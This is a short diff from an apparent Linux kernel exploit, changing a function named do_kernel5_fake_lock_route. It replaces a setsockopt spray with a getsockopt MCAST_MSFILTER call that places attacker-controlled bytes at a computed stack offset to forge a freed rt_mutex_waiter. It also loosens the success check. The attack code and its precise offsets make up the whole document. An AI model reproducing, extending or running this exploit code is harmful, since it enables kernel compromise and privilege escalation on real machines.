@@ -86,8 +86,15 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
     atomic_store(&g_exploit_session.race.consumer_stop, 0);
     atomic_store(&g_exploit_session.race.route_delay_usec, 0);
     errno = 0;
+    /* Spray through getsockopt(IPPROTO_IP, MCAST_MSFILTER): the kernel copies
+     * size0 = 0x90 bytes of this buffer into do_ip_getsockopt()'s stack local
+     * (sp + 0x128), which on a UDP socket sits at depth 0x7d8 - i.e. exactly
+     * 0x10 below the dead rt_mutex_waiter, so the forged waiter starts at
+     * buffer + 0x10. See multicast_waiter_route.cpp for the full derivation. */
+    socklen_t stamp_len = (socklen_t) stamp_size;
     int stamp_result =
-            setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
+            getsockopt(fd, IPPROTO_IP, MCAST_MSFILTER, stamp, &stamp_len);
+    int stamp_errno = errno;
     status.step = 61;
     status.error_number = errno;
     atomic_store(&g_exploit_session.race.consumer_go, 1);
@@ -100,7 +107,7 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
     close(fd);
     status.userspace_clean = 1;
     status.kernel_disarmed = 1;
-    if (stamp_result == 0 ||
+    if (stamp_result == 0 || stamp_errno == EADDRNOTAVAIL ||
             atomic_load(&g_exploit_session.race.consumer_success) > 0) {
         status.step = 0;
         status.error_number = 0;
